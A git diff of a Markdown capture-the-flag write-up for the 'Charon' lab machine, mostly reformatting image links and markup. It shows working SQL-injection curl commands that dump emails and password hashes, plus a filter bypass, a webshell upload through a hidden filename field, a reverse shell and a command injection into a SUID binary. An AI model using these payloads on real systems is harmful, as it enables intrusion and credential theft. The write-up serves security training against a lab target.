@@ -2,7 +2,7 @@
 icon: flag
 ---
 
-# Charon
+# charon
 
 ## Enumeration
 
@@ -15,18 +15,18 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-Visiting the website I find a yogurt website with a __"powered by: supercms"__ at the bottom
+Visiting the website I find a yogurt website with a **"powered by: supercms"** at the bottom
 
-
-![](/img/htb/charon/yogurt_site.png)
-
+![](../../.gitbook/assets/yogurt_site.png)
 
 fuzzing for directories I find a cmsdata folder
+
 ```bash
 $ ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.31/FUZZ -t 100
 ```
 
-I get a 403 forbidden while trying to access it 
+I get a 403 forbidden while trying to access it
+
 ```
 $ curl -s -X GET http://10.10.10.31/cmsdata/
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
@@ -56,55 +56,51 @@ upload.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 116
 
 In login.php I try to login with different credentials and trying sql injections but the only thing that changes is the url parameter to err=1 "http://10.10.10.31/cmsdata/login.php?err=1"
 
-
-![](/img/htb/charon/login_php.png)
-
+![](../../.gitbook/assets/login_php.png)
 
 Proceed to click on forgot password, testing for a SQLI results in a message saying "Error In Database"
 
-
-![](/img/htb/charon/error_in_database_1.png)
-
+![](../../.gitbook/assets/error_in_database_1.png)
 
 I will be sending the requests throught cURL so I grab the parameter names which are "email" and "submit"
 
-
-![](/img/htb/charon/parameters_1.png)
-
+![](../../.gitbook/assets/parameters_1.png)
 
 #### retrieving valid emails
 
 Testing for other sql injections I end up with the following that retrieves a valid email and limits the result to a specific index in this case test1, for limit 1,1 it will be test2@aa.com=>test2 and so on
+
 ```bash
 $ curl -s -X POST http://10.10.10.31/cmsdata/forgot.php -d "email=admin@charon.htb' or 1=1 limit 0,1-- -" -d "submit=submit" | grep "<h2>" | awk -F'<h2>' '{print $2}'
  Email sent to: test1@aa.com=>test1 
- ```
- 
- with a for loop I can retrieve all the emails looking for the ones that are different from "test", I end up finding two valid emails 
+```
+
+with a for loop I can retrieve all the emails looking for the ones that are different from "test", I end up finding two valid emails
 
 ```bash
 $ for i in {0..999}; do (curl -s -X POST http://10.10.10.31/cmsdata/forgot.php -d "email=admin@charon.htb' or 1=1 limit $i,1-- -" -d "submit=submit" | grep "<h2>" | awk -F'<h2>' '{print $2}')& ; done | grep -vE "test|User not found with that email"
  Email sent to: adm@nowhere.com=>super_cms_adm    
  Email sent to: decoder@nowhere.com=>decoder   
- ```
+```
 
 #### union injection
- 
- Trying with a "union" and "UNION" injection results in an error
- 
- ```bash
- $ curl -s -X POST http://10.10.10.31/cmsdata/forgot.php -d "email=admin@charon.htb' union select 1,2,3,4-- -" -d "submit=submit"
+
+Trying with a "union" and "UNION" injection results in an error
+
+```bash
+$ curl -s -X POST http://10.10.10.31/cmsdata/forgot.php -d "email=admin@charon.htb' union select 1,2,3,4-- -" -d "submit=submit"
 Error                                                                                                                                        $ curl -s -X POST http://10.10.10.31/cmsdata/forgot.php -d "email=admin@charon.htb' UNION select 1,2,3,4-- -" -d "submit=submit"
 Error 
 ```
 
 To bypass it, it is needed to mix uppercase and lowercase letters
+
 ```bash
 $ curl -s -X POST http://10.10.10.31/cmsdata/forgot.php -d "email=admin@charon.htb' Union select 1,2,3,4-- -" -d "submit=submit" | grep "<h2>" | awk -F'<h2>' '{print $2}'
  Incorrect format  
 ```
 
-To fix the incorrect format error an email has to be placed in one of the tags from the union select injection, in this case is in the 4th one 
+To fix the incorrect format error an email has to be placed in one of the tags from the union select injection, in this case is in the 4th one
 
 ```bash
 $ curl -s -X POST http://10.10.10.31/cmsdata/forgot.php -d "email=admin@charon.htb' Union select 1,2,3,\"x@charon.htb\"-- -" -d "submit=submit" | grep "<h2>" | awk -F'<h2>' '{print $2}'
@@ -113,7 +109,7 @@ $ curl -s -X POST http://10.10.10.31/cmsdata/forgot.php -d "email=admin@charon.h
 
 #### retrieving databases
 
-proceeding with the injections I begin by retrieving the databases, in this case to reflect the injection it was needed to place a group_concat(schema_name) in the second tag from the union injection, group_concat will group all the output in one line.
+proceeding with the injections I begin by retrieving the databases, in this case to reflect the injection it was needed to place a group\_concat(schema\_name) in the second tag from the union injection, group\_concat will group all the output in one line.
 
 ```bash
 $ curl -s -X POST http://10.10.10.31/cmsdata/forgot.php -d "email=admin@charon.htb' Union select 1,group_concat(schema_name),3,\"x@charon.htb\" from information_schema.schemata-- -" -d "submit=submit" | grep "<h2>" | awk -F'<h2>' '{print $2}'
@@ -129,7 +125,7 @@ $ curl -s -X POST http://10.10.10.31/cmsdata/forgot.php -d "email=admin@charon.h
  Email sent to: x@charon.htb=>groups,license,operators
 ```
 
-#### retrieving columns 
+#### retrieving columns
 
 retrieving the columns from the tables of the database
 
@@ -139,6 +135,7 @@ $ curl -s -X POST http://10.10.10.31/cmsdata/forgot.php -d "email=admin@charon.h
 ```
 
 #### retrieving data
+
 retrieve all data from the columns where the email is not "test", resulting tin the retrieval of md5 hashed passwords
 
 ```bash
@@ -152,88 +149,69 @@ decoder:5f4dcc3b5aa765d61d8327deb882cf99:decoder@nowhere.com
 
 The hashes are cracked with crackstation
 
-![](/img/htb/charon/crackstation_1.png)
+![](../../.gitbook/assets/crackstation_1.png)
 
 ## shell as www-data
 
 ### file upload exploit
 
-logging with the credentials super_cms_adm:tamarro shows the following panel
+logging with the credentials super\_cms\_adm:tamarro shows the following panel
 
+![](../../.gitbook/assets/supercms_1.png)
 
-![](/img/htb/charon/supercms_1.png)
+I click on **Upload\_Image\_FIle** which shows the following
 
-
-I click on __Upload_Image_FIle__ which shows the following
-
-
-![](/img/htb/charon/upload_image_1.png)
-
+![](../../.gitbook/assets/upload_image_1.png)
 
 Trying to upload a webshell results in an error of invalid extension
 
+![](../../.gitbook/assets/error_1.png)
 
-![](/img/htb/charon/error_1.png)
+If the request is intercepted with burpsuite and replace a legitimate image with a webshell the result is another error saying that it requires a valid image or gif extension
 
-If the request is intercepted with burpsuite and replace a legitimate image with a webshell the result is another error saying that it requires a valid image or gif extension 
-
-
-![](/img/htb/charon/error_2.png)
+![](../../.gitbook/assets/error_2.png)
 
 Inspecting the site I find a hidden parameter
 
+![](../../.gitbook/assets/hidden_1.png)
 
-![](/img/htb/charon/hidden_1.png)
+To uncomment that field I first reload the site while intercepting the request, once the request is intercept I do **right click > do intercept > response to this request** and I uncomment the field on the new response
 
-
-To uncomment that field I first reload the site while intercepting the request, once the request is intercept I do __right click > do intercept > response to this request__ and I uncomment the field on the new response
-
-
-![](/img/htb/charon/uncommenting.png)
+![](../../.gitbook/assets/uncommenting.png)
 
 remove the hidden type from the input
 
+![](../../.gitbook/assets/uncommenting_2.png)
 
-![](/img/htb/charon/uncommenting_2.png)
+decode the field name
 
-decode the field name 
+![](../../.gitbook/assets/field_name_1.png)
 
-![](/img/htb/charon/field_name_1.png)
+![](../../.gitbook/assets/field_name_2.png)
 
+another field appears in the website
 
-
-![](/img/htb/charon/field_name_2.png)
-
-
-another field appears in the website 
-
-
-![](/img/htb/charon/new_field.png)
+![](../../.gitbook/assets/new_field.png)
 
 this field allows to change the filename of the uploaded file
 
-
-![](/img/htb/charon/field_1.png)
+![](../../.gitbook/assets/field_1.png)
 
 to exploit this first I upload an image with a filename shell.php
 
-
-![](/img/htb/charon/upload_1.png)
+![](../../.gitbook/assets/upload_1.png)
 
 I change the file content to a webshell
 
-
-![](/img/htb/charon/upload_2.png)
+![](../../.gitbook/assets/upload_2.png)
 
 a success message confirms the upload
 
-
-![](/img/htb/charon/upload_3.png)
+![](../../.gitbook/assets/upload_3.png)
 
 and I'm able to execute commands remotely
 
-
-![](/img/htb/charon/command_1.png)
+![](../../.gitbook/assets/command_1.png)
 
 sending a request to the webshell allows me to get a reverse shell
 
@@ -250,20 +228,20 @@ bash: no job control in this shell
 www-data@charon:/var/www/html/freeeze/images$ 
 ```
 
-To stabilize the shell I do 
+To stabilize the shell I do
 
-- script /dev/null -c bash
-- ctrl z
-- stty raw -echo ; fg
-- reset xterm
-- export TERM=xterm
-- stty rows 39 columns 155 (change this to your terminal size, check stty size to know your terminal dimensions)
+* script /dev/null -c bash
+* ctrl z
+* stty raw -echo ; fg
+* reset xterm
+* export TERM=xterm
+* stty rows 39 columns 155 (change this to your terminal size, check stty size to know your terminal dimensions)
 
 ## shell as decoder
 
-the user www-data is able to list and read some files from /home/decoder 
+the user www-data is able to list and read some files from /home/decoder
 
-``` shell
+```shell
 www-data@charon:/home/decoder$ ls
 decoder.pub  pass.crypt  user.txt
 www-data@charon:/home/decoder$ cat decoder.pub 
@@ -279,7 +257,7 @@ total 12
 www-data@charon:/home/decoder$ 
 ```
 
-There is a public file and an encrypted password, since the public key is small the process of creating the private key can be done to decrypt the pass.crypt file 
+There is a public file and an encrypted password, since the public key is small the process of creating the private key can be done to decrypt the pass.crypt file
 
 ### Decrypting the Encrypted Key
 
@@ -361,7 +339,6 @@ uid=1001(decoder) gid=1001(freeeze) groups=1001(freeeze)
 decoder@charon:~$ 
 ```
 
-
 ## shell as root
 
 looking for files with suid permission I find a supershell one
@@ -371,7 +348,7 @@ decoder@charon:~$ find / -type f -perm -4000 2>/dev/null
 /usr/local/bin/supershell
 ```
 
-doing a "strings" on supershell I find that the only command allowed is /bin/ls, but I'm able to inject commands 
+doing a "strings" on supershell I find that the only command allowed is /bin/ls, but I'm able to inject commands
 
 ```bash
 decoder@charon:/usr/local/bin$ ./supershell '/bin/ls $(touch file)'
